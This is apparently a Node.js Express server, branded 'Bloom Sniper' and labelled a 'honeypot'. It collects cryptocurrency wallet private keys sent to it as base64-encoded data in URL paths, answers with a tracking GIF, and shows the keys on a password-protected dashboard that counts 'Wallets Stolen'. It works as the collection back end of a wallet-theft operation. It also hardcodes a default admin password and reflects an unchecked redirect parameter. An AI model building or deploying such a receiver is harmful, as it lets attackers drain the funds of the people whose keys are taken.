const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');
const LOGS_FOLDER = path.join(__dirname, 'logs');

// Admin credentials - CHANGE THESE!
const ADMIN_USERNAME = process.env.ADMIN_USER || 'MrHoneypot';
const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'hancox2005S!';

// Simple session storage (in-memory)
const sessions = new Map();

if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });

app.set('trust proxy', true);
app.use(express.urlencoded({ extended: true }));

// Get real client IP
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) return forwarded.split(',')[0].trim();
    return req.headers['x-real-ip'] || req.ip || req.socket.remoteAddress;
}

function logAccess(req, type, extra = {}) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || 'none',
        url: req.originalUrl,
        ...extra
    };
    fs.appendFileSync(path.join(LOGS_FOLDER, 'access.log'), JSON.stringify(logEntry) + '\n');
    console.log(`[${type}] ${logEntry.ip}`);
}

// Session cookie parser
function getSession(req) {
    const cookie = req.headers.cookie || '';
    const match = cookie.match(/sessionId=([^;]+)/);
    return match ? match[1] : null;
}

function isAuthenticated(req) {
    const sessionId = getSession(req);
    return sessionId && sessions.has(sessionId);
}

function requireAuth(req, res, next) {
    if (isAuthenticated(req)) {
        return next();
    }
    res.redirect('/admin/login?redirect=' + encodeURIComponent(req.originalUrl));
}

// Bloom Sniper Styles
const bloomStyles = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
    
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body { 
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1625 25%, #2d1b3e 50%, #4a2c5a 75%, rgba(255, 105, 180, 0.1) 100%);
        color: #fff; 
        min-height: 100vh; 
        margin: 0; 
        padding: 0;
        line-height: 1.6;
    }
    
    .container { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
    
    .header { 
        background: rgba(26, 22, 37, 0.8); 
        backdrop-filter: blur(20px); 
        border-bottom: 1px solid rgba(255, 182, 193, 0.1); 
        position: fixed; 
        top: 0; 
        left: 0; 
        right: 0; 
        z-index: 1000; 
    }
    
    .header-content { 
        display: flex; 
        align-items: center; 
        justify-content: space-between; 
        height: 80px; 
    }
    
    .logo { 
        font-size: 1.75rem; 
        font-weight: 900; 
        color: #fff; 
        text-shadow: rgba(255, 182, 193, 0.6) 0px 0px 30px; 
        letter-spacing: -0.5px; 
    }
    
    .logo .accent { color: rgb(255, 105, 180); text-shadow: rgba(255, 105, 180, 0.8) 0px 0px 20px; }
    
    .main { padding: 100px 0 40px; }
    
    .page-title { 
        font-size: clamp(2rem, 5vw, 3rem); 
        font-weight: 800; 
        margin-bottom: 10px;
        text-align: center;
        text-shadow: rgba(255, 182, 193, 0.3) 0px 2px 30px;
    }
    
    .page-subtitle { 
        font-size: 1.1rem; 
        color: rgb(229, 224, 240); 
        text-align: center; 
        margin-bottom: 40px;
        opacity: 0.8;
    }
    
    .btn { 
        padding: 12px 24px; 
        border-radius: 12px; 
        font-weight: 600; 
        font-size: 14px; 
        transition: 0.3s; 
        border: none;
        cursor: pointer; 
        display: inline-flex; 
        align-items: center; 
        gap: 8px; 
        text-decoration: none;
    }
    
    .btn-primary { 
        background: linear-gradient(135deg, rgb(255, 105, 180), rgb(255, 20, 147), rgb(220, 20, 60)); 
        color: white; 
        box-shadow: rgba(255, 105, 180, 0.4) 0px 4px 15px; 
    }
    
    .btn-primary:hover { 
        transform: translateY(-2px); 
        box-shadow: rgba(255, 105, 180, 0.5) 0px 8px 25px; 
    }
    
    .btn-secondary { 
        background: rgba(255, 255, 255, 0.08); 
        color: #fff; 
        border: 1px solid rgba(255, 182, 193, 0.3); 
    }
    
    .btn-secondary:hover { 
        background: rgba(255, 182, 193, 0.15); 
        border-color: rgba(255, 182, 193, 0.6); 
    }
    
    .btn-danger {
        background: rgba(255, 0, 0, 0.2);
        color: #ff6b6b;
        border: 1px solid rgba(255, 0, 0, 0.3);
    }
    
    .btn-danger:hover {
        background: rgba(255, 0, 0, 0.3);
    }
    
    .card { 
        background: rgba(255, 255, 255, 0.06); 
        border-radius: 24px; 
        border: 1px solid rgba(255, 182, 193, 0.2); 
        padding: 32px; 
        margin-bottom: 24px;
        transition: 0.4s; 
        backdrop-filter: blur(10px); 
    }
    
    .card:hover { 
        border-color: rgba(255, 182, 193, 0.4); 
        background: rgba(255, 255, 255, 0.08); 
    }
    
    .stats-grid { 
        display: grid; 
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
        gap: 24px; 
        margin-bottom: 40px;
    }
    
    .stat-card { 
        background: rgba(255, 255, 255, 0.06); 
        border-radius: 20px; 
        border: 1px solid rgba(255, 182, 193, 0.2); 
        padding: 24px; 
        text-align: center;
        transition: 0.3s;
    }
    
    .stat-card:hover {
        transform: translateY(-4px);
        border-color: rgba(255, 182, 193, 0.4);
        box-shadow: rgba(255, 105, 180, 0.2) 0px 10px 30px;
    }
    
    .stat-label { 
        color: rgb(184, 179, 196); 
        font-size: 0.9rem; 
        margin-bottom: 8px;
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    
    .stat-value { 
        font-size: 2.5rem; 
        font-weight: 800; 
        color: rgb(255, 105, 180);
        text-shadow: rgba(255, 105, 180, 0.5) 0px 0px 20px;
    }
    
    .capture-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
        gap: 24px;
    }
    
    .capture-card { 
        background: rgba(255, 255, 255, 0.06); 
        border-radius: 20px; 
        border: 1px solid rgba(255, 182, 193, 0.2); 
        padding: 24px; 
        transition: 0.3s;
    }
    
    .capture-card:hover {
        border-color: rgba(255, 182, 193, 0.4);
        transform: translateY(-4px);
        box-shadow: rgba(255, 105, 180, 0.2) 0px 15px 40px;
    }
    
    .capture-header {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        margin-bottom: 16px;
        padding-bottom: 16px;
        border-bottom: 1px solid rgba(255, 182, 193, 0.1);
    }
    
    .capture-title {
        font-size: 1.1rem;
        font-weight: 700;
        color: #fff;
    }
    
    .capture-time {
        font-size: 0.85rem;
        color: rgb(184, 179, 196);
    }
    
    .capture-meta {
        margin-bottom: 16px;
    }
    
    .meta-row {
        display: flex;
        margin-bottom: 8px;
        font-size: 0.9rem;
    }
    
    .meta-label {
        color: rgb(255, 105, 180);
        font-weight: 600;
        min-width: 80px;
    }
    
    .meta-value {
        color: rgb(229, 224, 240);
        font-family: 'JetBrains Mono', monospace;
    }
    
    .wallet-list {
        margin-top: 16px;
    }
    
    .wallet-item {
        background: rgba(0, 0, 0, 0.3);
        border-radius: 12px;
        padding: 16px;
        margin-bottom: 12px;
        border: 1px solid rgba(255, 182, 193, 0.1);
    }
    
    .wallet-header {
        display: flex;
        align-items: center;
        gap: 10px;
        margin-bottom: 12px;
    }
    
    .wallet-badge {
        background: linear-gradient(135deg, rgb(255, 105, 180), rgb(255, 20, 147));
        color: white;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 0.75rem;
        font-weight: 700;
        text-transform: uppercase;
    }
    
    .wallet-field {
        margin-bottom: 8px;
    }
    
    .wallet-field-label {
        color: rgb(184, 179, 196);
        font-size: 0.8rem;
        margin-bottom: 4px;
    }
    
    .wallet-field-value {
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.85rem;
        word-break: break-all;
        padding: 8px 12px;
        background: rgba(0, 0, 0, 0.4);
        border-radius: 8px;
        border: 1px solid rgba(255, 182, 193, 0.1);
    }
    
    .wallet-address {
        color: rgb(34, 211, 238);
    }
    
    .wallet-key {
        color: rgb(248, 113, 113);
    }
    
    .actions {
        display: flex;
        gap: 10px;
        margin-top: 16px;
    }
    
    .actions .btn {
        padding: 8px 16px;
        font-size: 0.85rem;
    }
    
    .nav-bar {
        display: flex;
        gap: 12px;
        margin-bottom: 30px;
        flex-wrap: wrap;
    }
    
    .login-box { 
        max-width: 400px; 
        margin: 100px auto; 
        border: 2px solid rgba(255, 182, 193, 0.3); 
        padding: 40px; 
        background: rgba(26, 22, 37, 0.8);
        border-radius: 24px;
        backdrop-filter: blur(20px);
    }
    
    .login-box h2 { 
        margin-top: 0; 
        text-align: center;
        font-size: 1.75rem;
        margin-bottom: 30px;
    }
    
    input[type="text"], input[type="password"] { 
        width: 100%; 
        padding: 14px; 
        margin: 10px 0; 
        background: rgba(255, 255, 255, 0.08); 
        border: 1px solid rgba(255, 182, 193, 0.3); 
        color: #fff; 
        font-family: 'Inter', sans-serif; 
        font-size: 15px; 
        border-radius: 12px;
        transition: 0.3s;
    }
    
    input[type="text"]:focus, input[type="password"]:focus { 
        outline: none; 
        border-color: rgb(255, 105, 180); 
        box-shadow: rgba(255, 105, 180, 0.3) 0px 0px 15px;
    }
    
    .error { 
        color: #ff6b6b; 
        margin: 15px 0; 
        text-align: center;
        padding: 12px;
        background: rgba(255, 0, 0, 0.1);
        border-radius: 8px;
        border: 1px solid rgba(255, 0, 0, 0.2);
    }
    
    .empty-state {
        text-align: center;
        padding: 60px 20px;
        color: rgb(184, 179, 196);
    }
    
    .empty-state-icon {
        font-size: 4rem;
        margin-bottom: 20px;
        opacity: 0.5;
    }
    
    pre { 
        background: rgba(0, 0, 0, 0.4); 
        padding: 16px; 
        overflow-x: auto; 
        border-radius: 12px;
        border: 1px solid rgba(255, 182, 193, 0.1);
        font-size: 0.85rem;
        color: rgb(229, 224, 240);
    }
    
    @media (max-width: 768px) {
        .capture-grid { grid-template-columns: 1fr; }
        .stats-grid { grid-template-columns: repeat(2, 1fr); }
        .header-content { height: 70px; }
        .logo { font-size: 1.5rem; }
        .main { padding-top: 90px; }
    }
`;

// ============================================
// LOGIN ROUTES
// ============================================

app.get('/admin/login', (req, res) => {
    logAccess(req, 'LOGIN_PAGE');
    
    if (isAuthenticated(req)) {
        return res.redirect('/admin');
    }
    
    const error = req.query.error ? '<div class="error">Invalid username or password</div>' : '';
    const redirect = req.query.redirect || '/admin';
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Login - Bloom Sniper</title>
        <style>${bloomStyles}</style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo" style="text-align: center; margin-bottom: 10px;">Bloom <span class="accent">Sniper</span></div>
            <h2 style="color: #fff; font-weight: 700;">Admin Login</h2>
            ${error}
            <form method="POST" action="/admin/login">
                <input type="hidden" name="redirect" value="${redirect}">
                <input type="text" name="username" placeholder="Username" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 20px;">Login</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

app.post('/admin/login', express.urlencoded({ extended: true }), (req, res) => {
    const { username, password, redirect } = req.body;
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
        sessions.set(sessionId, { created: Date.now() });
        res.setHeader('Set-Cookie', `sessionId=${sessionId}; HttpOnly; Path=/; Max-Age=86400`);
        logAccess(req, 'LOGIN_SUCCESS');
        res.redirect(redirect || '/admin');
    } else {
        logAccess(req, 'LOGIN_FAILED', { username });
        res.redirect('/admin/login?error=1');
    }
});

app.get('/admin/logout', (req, res) => {
    const sessionId = getSession(req);
    if (sessionId) sessions.delete(sessionId);
    res.setHeader('Set-Cookie', 'sessionId=; HttpOnly; Path=/; Max-Age=0');
    res.redirect('/admin/login');
});

// ============================================
// PROTECTED ADMIN ROUTES
// ============================================

app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.status(200).json({ status: 'ok', msg: 'OK' });
});

app.get('/', (req, res) => {
    logAccess(req, 'ROOT');
    res.status(200).send('OK');
});

// HTML Dashboard
app.get('/admin', requireAuth, (req, res) => {
    logAccess(req, 'ADMIN_DASHBOARD');
    
    try {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files.map(f => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                data.filename = f;
                return data;
            } catch (e) { return null; }
        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Honeypot Dashboard - Bloom Sniper</title>
            <style>${bloomStyles}</style>
        </head>
        <body>
            <header class="header">
                <div class="container">
                    <div class="header-content">
                        <div class="logo">Honeypot <span class="accent">Dashboard</span></div>
                        <div style="display: flex; gap: 12px;">
                            <a href="/admin/logs" class="btn btn-secondary">View All</a>
                            <a href="/admin/logout" class="btn btn-danger">Logout</a>
                        </div>
                    </div>
                </div>
            </header>
            
            <main class="main">
                <div class="container">
                    <h1 class="page-title">🍯 Capture Dashboard</h1>
                    <p class="page-subtitle">Real-time wallet extraction monitoring</p>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-label">Total Captures</div>
                            <div class="stat-value">${captures.length}</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Wallets Stolen</div>
                            <div class="stat-value">${totalWallets}</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Unique Attackers</div>
                            <div class="stat-value">${uniqueIps.length}</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Server Time</div>
                            <div class="stat-value" style="font-size: 1.5rem;">${new Date().toLocaleTimeString()}</div>
                        </div>
                    </div>
                    
                    <div class="nav-bar">
                        <a href="/admin" class="btn btn-primary">Recent Captures</a>
                        <a href="/admin/logs" class="btn btn-secondary">All Captures</a>
                        <a href="/admin/logs?download=all" class="btn btn-secondary">⬇ Download All</a>
                    </div>
                    
                    <h2 style="margin-bottom: 20px; font-size: 1.5rem; font-weight: 700;">Recent Captures</h2>
                    
                    <div class="capture-grid">
                        ${captures.slice(0, 12).map(c => {
                            const walletCount = c.wallets?.length || 0;
                            return `
                            <div class="capture-card">
                                <div class="capture-header">
                                    <div>
                                        <div class="capture-title">${c.filename}</div>
                                        <div class="capture-time">${new Date(c.receivedAt).toLocaleString()}</div>
                                    </div>
                                </div>
                                <div class="capture-meta">
                                    <div class="meta-row">
                                        <span class="meta-label">IP:</span>
                                        <span class="meta-value">${c.attackerIp || 'Unknown'}</span>
                                    </div>
                                    <div class="meta-row">
                                        <span class="meta-label">Code:</span>
                                        <span class="meta-value">${c.code || 'N/A'}</span>
                                    </div>
                                    <div class="meta-row">
                                        <span class="meta-label">Wallets:</span>
                                        <span class="meta-value" style="color: rgb(255, 105, 180); font-weight: 700;">${walletCount}</span>
                                    </div>
                                </div>
                                <div class="actions">
                                    <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="btn btn-primary">View Details</a>
                                    <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="btn btn-secondary">Download</a>
                                </div>
                            </div>
                            `;
                        }).join('') || `
                            <div class="empty-state" style="grid-column: 1 / -1;">
                                <div class="empty-state-icon">📭</div>
                                <h3>No captures yet</h3>
                                <p>Waiting for attacker data...</p>
                            </div>
                        `}
                    </div>
                </div>
            </main>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// HTML Logs page with all captures
app.get('/admin/logs', requireAuth, (req, res) => {
    logAccess(req, 'ADMIN_LOGS');
    
    if (req.query.download === 'all') {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const allData = files.map(f => {
            try {
                return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
            } catch (e) { return null; }
        }).filter(Boolean);
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename="all_captures.json"');
        return res.send(JSON.stringify(allData, null, 2));
    }
    
    try {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files.map(f => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                data.filename = f;
                return data;
            } catch (e) { return null; }
        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>All Captures - Bloom Sniper</title>
            <style>${bloomStyles}</style>
        </head>
        <body>
            <header class="header">
                <div class="container">
                    <div class="header-content">
                        <div class="logo">All <span class="accent">Captures</span></div>
                        <div style="display: flex; gap: 12px;">
                            <a href="/admin" class="btn btn-secondary">Dashboard</a>
                            <a href="/admin/logout" class="btn btn-danger">Logout</a>
                        </div>
                    </div>
                </div>
            </header>
            
            <main class="main">
                <div class="container">
                    <h1 class="page-title">📋 All Captured Data</h1>
                    <p class="page-subtitle">${captures.length} files with ${totalWallets} total wallets</p>
                    
                    <div class="nav-bar">
                        <a href="/admin" class="btn btn-secondary">← Dashboard</a>
                        <a href="/admin/logs?download=all" class="btn btn-primary">⬇ Download All JSON</a>
                    </div>
                    
                    <div class="capture-grid">
                        ${captures.map(c => `
                            <div class="capture-card">
                                <div class="capture-header">
                                    <div>
                                        <div class="capture-title">${c.filename}</div>
                                        <div class="capture-time">${new Date(c.receivedAt).toLocaleString()}</div>
                                    </div>
                                </div>
                                <div class="capture-meta">
                                    <div class="meta-row">
                                        <span class="meta-label">IP:</span>
                                        <span class="meta-value">${c.attackerIp || 'Unknown'}</span>
                                    </div>
                                    <div class="meta-row">
                                        <span class="meta-label">Code:</span>
                                        <span class="meta-value">${c.code || 'N/A'}</span>
                                    </div>
                                    <div class="meta-row">
                                        <span class="meta-label">Wallets:</span>
                                        <span class="meta-value" style="color: rgb(255, 105, 180); font-weight: 700;">${c.wallets?.length || 0}</span>
                                    </div>
                                </div>
                                <div class="actions">
                                    <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="btn btn-primary">View Details</a>
                                    <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="btn btn-secondary">Download</a>
                                </div>
                            </div>
                        `).join('') || `
                            <div class="empty-state" style="grid-column: 1 / -1;">
                                <div class="empty-state-icon">📭</div>
                                <h3>No captures yet</h3>
                            </div>
                        `}
                    </div>
                </div>
            </main>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// Download individual file
app.get('/admin/download', requireAuth, (req, res) => {
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) return res.status(400).send('Invalid filename');
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) return res.status(404).send('File not found');
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.sendFile(filePath);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// View specific file with wallet details
app.get('/admin/file', requireAuth, (req, res) => {
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) return res.status(400).send('Invalid filename');
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) return res.status(404).send('File not found');
        
        const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        
        // Process wallets to show correct type and fields
        const processedWallets = (data.wallets || []).map(w => {
            if (w.bnbKey) {
                // EVM wallet
                return {
                    type: 'eBundle',
                    public: 'N/A',
                    private: w.bnbKey
                };
            } else if (w.address && w.key) {
                // Solana wallet
                return {
                    type: 'sBundle',
                    public: w.address,
                    private: w.key
                };
            }
            return { type: 'unknown', public: w.address || w.pub || 'N/A', private: w.key || w.priv || 'N/A' };
        });
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Capture: ${filename}</title>
            <style>${bloomStyles}</style>
        </head>
        <body>
            <header class="header">
                <div class="container">
                    <div class="header-content">
                        <div class="logo">Capture <span class="accent">Details</span></div>
                        <div style="display: flex; gap: 12px;">
                            <a href="/admin" class="btn btn-secondary">Dashboard</a>
                            <a href="/admin/logs" class="btn btn-secondary">All Captures</a>
                            <a href="/admin/logout" class="btn btn-danger">Logout</a>
                        </div>
                    </div>
                </div>
            </header>
            
            <main class="main">
                <div class="container">
                    <h1 class="page-title">📋 ${filename}</h1>
                    
                    <div class="nav-bar">
                        <a href="/admin" class="btn btn-secondary">← Dashboard</a>
                        <a href="/admin/logs" class="btn btn-secondary">← All Captures</a>
                        <a href="/admin/download?f=${encodeURIComponent(filename)}" class="btn btn-primary">⬇ Download JSON</a>
                    </div>
                    
                    <div class="card">
                        <h2 style="margin-bottom: 20px; font-size: 1.3rem; font-weight: 700;">Attacker Information</h2>
                        <div class="meta-row" style="margin-bottom: 12px;">
                            <span class="meta-label">IP Address:</span>
                            <span class="meta-value">${data.attackerIp || 'Unknown'}</span>
                        </div>
                        <div class="meta-row" style="margin-bottom: 12px;">
                            <span class="meta-label">Timestamp:</span>
                            <span class="meta-value">${new Date(data.receivedAt).toLocaleString()}</span>
                        </div>
                        <div class="meta-row" style="margin-bottom: 12px;">
                            <span class="meta-label">Code:</span>
                            <span class="meta-value">${data.code || 'N/A'}</span>
                        </div>
                        <div class="meta-row">
                            <span class="meta-label">User Agent:</span>
                            <span class="meta-value" style="font-size: 0.8rem;">${data.userAgent || 'Unknown'}</span>
                        </div>
                    </div>
                    
                    <h2 style="margin: 40px 0 20px; font-size: 1.5rem; font-weight: 700;">Wallets (${processedWallets.length})</h2>
                    
                    ${processedWallets.map((w, i) => `
                        <div class="card" style="border-color: ${w.type === 'eBundle' ? 'rgba(255, 20, 147, 0.4)' : 'rgba(34, 211, 238, 0.4)'};">
                            <div class="wallet-header">
                                <span class="wallet-badge" style="background: ${w.type === 'eBundle' ? 'linear-gradient(135deg, rgb(255, 20, 147), rgb(220, 20, 60))' : 'linear-gradient(135deg, rgb(34, 211, 238), rgb(59, 130, 246))'};">
                                    ${w.type}
                                </span>
                                <span style="color: rgb(184, 179, 196); font-size: 0.9rem;">#${i + 1}</span>
                            </div>
                            
                            ${w.public !== 'N/A' ? `
                            <div class="wallet-field">
                                <div class="wallet-field-label">Public Address</div>
                                <div class="wallet-field-value wallet-address">${w.public}</div>
                            </div>
                            ` : ''}
                            
                            <div class="wallet-field">
                                <div class="wallet-field-label">Private Key</div>
                                <div class="wallet-field-value wallet-key">${w.private}</div>
                            </div>
                        </div>
                    `).join('') || '<div class="empty-state"><p>No wallets in this capture</p></div>'}
                    
                    <div class="card" style="margin-top: 40px;">
                        <h2 style="margin-bottom: 20px; font-size: 1.3rem; font-weight: 700;">Raw JSON Data</h2>
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    </div>
                </div>
            </main>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// Redirect loader.js and any .js files to axiom.trade
app.get('/loader.js', (req, res) => {
    logAccess(req, 'LOADER_REQUEST_BLOCKED');
    res.redirect(302, 'https://axiom.trade');
});

// Block access to all JavaScript files and server code
app.get('*.js', (req, res) => {
    logAccess(req, 'JS_FILE_BLOCKED', { path: req.path });
    res.redirect(302, 'https://axiom.trade');
});

// Block access to package.json and other sensitive files
app.get(['/package.json', '/package-lock.json', '/.env', '/.git/*', '/*.md', '/README*', '/LICENSE*'], (req, res) => {
    logAccess(req, 'SENSITIVE_FILE_BLOCKED', { path: req.path });
    res.redirect(302, 'https://axiom.trade');
});

// ============================================
// CATCH-ALL ROUTE LAST (for stolen data)
// ============================================

app.get('*', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    
    if (req.path.includes('.')) {
        return res.status(404).end();
    }
    
    const encodedData = req.path.substring(1);
    
    console.log(`[DATA] From: ${clientIp} | Path: ${encodedData.substring(0, 50)}...`);
    
    if (encodedData.length < 20) {
        logAccess(req, 'PING', { length: encodedData.length });
        return sendGif(res);
    }
    
    try {
        let decodedData = decodeURIComponent(encodedData);
        
        const padding = 4 - (decodedData.length % 4);
        if (padding !== 4) decodedData += '='.repeat(padding);
        
        const jsonStr = Buffer.from(decodedData, 'base64').toString('utf8');
        const data = JSON.parse(jsonStr);
        
        const wallets = data.wallets || [];
        
        const record = {
            receivedAt: timestamp,
            attackerIp: clientIp,
            userAgent: data.header || req.headers['user-agent'],
            code: data.code,
            site: data.site,
            walletCount: wallets.length,
            wallets: wallets,
            rawPayload: data
        };
        
        const filename = `capture_${Date.now()}_${clientIp.replace(/[^0-9a-zA-Z]/g, '_')}.json`;
        fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
        
        console.log(`✅ SAVED: ${filename} | Wallets: ${wallets.length}`);
        logAccess(req, 'CAPTURE', { filename, wallets: wallets.length });
        
    } catch (err) {
        console.error(`❌ Error: ${err.message}`);
        logAccess(req, 'ERROR', { error: err.message });
    }
    
    sendGif(res);
});

function sendGif(res) {
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    res.send(gif);
}

// ============================================
// START SERVER
// ============================================

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🍯 Honeypot running on port ${PORT}`);
    console.log(`Dashboard: http://0.0.0.0:${PORT}/admin`);
    console.log(`Login: http://0.0.0.0:${PORT}/admin/login`);
    console.log(`Health: http://0.0.0.0:${PORT}/health`);
    console.log(`Admin User: ${ADMIN_USERNAME}`);
});

server.on('error', (err) => {
    console.error('Server error:', err);
});